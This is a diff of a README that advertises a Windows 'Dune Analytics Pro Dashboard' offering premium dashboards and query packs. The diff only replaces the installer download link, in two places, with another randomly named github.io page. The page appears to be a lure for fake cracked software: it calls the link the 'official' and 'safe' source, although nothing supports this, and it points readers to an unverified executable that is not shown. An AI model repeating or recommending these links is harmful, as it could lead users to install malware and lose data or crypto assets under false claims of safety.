@@ -2,7 +2,7 @@
 
 Welcome to the Dune Analytics Pro Dashboard, your ultimate solution for unlocking the full potential of Dune Analytics on Windows. This desktop application, updated for 2026, provides seamless access to premium dashboards and complete query packs, empowering users with advanced data insights and real-time blockchain analytics. Whether you're a data enthusiast or a professional analyst, this tool is designed to enhance your workflow with a user-friendly interface and optimized performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,6 +69,6 @@ We've compiled answers to common queries to help you resolve any concerns quickl
 
 For the latest version of the Dune Analytics Pro Dashboard, please use the following link. This is the official source and ensures you get a safe, up-to-date installer:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Disclaimer**: This tool is provided for educational and personal use. Always ensure compliance with Dune Analytics' terms of service and local regulations when accessing blockchain data. The developers are not responsible for any misuse. Last updated: 2026.
